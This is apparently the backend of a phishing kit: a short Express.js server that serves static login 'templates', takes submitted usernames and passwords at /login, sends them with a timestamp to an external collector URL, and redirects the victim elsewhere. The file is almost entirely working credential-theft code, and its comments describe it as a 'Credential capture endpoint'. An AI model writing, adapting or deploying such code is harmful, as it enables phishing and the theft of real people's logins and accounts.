const express = require('express');
const app = express();
const config = require('./config');

app.use(express.static('templates'));
app.use(express.urlencoded({ extended: true }));

// Credential capture endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // Forward to collection server
  fetch(config.COLLECTOR_URL, {
    method: 'POST',
    body: JSON.stringify({ u: username, p: password, t: Date.now() })
  });
  res.redirect(config.REDIRECT_URL);
});

app.listen(config.PORT, () => console.log(`Running on ${config.PORT}`));
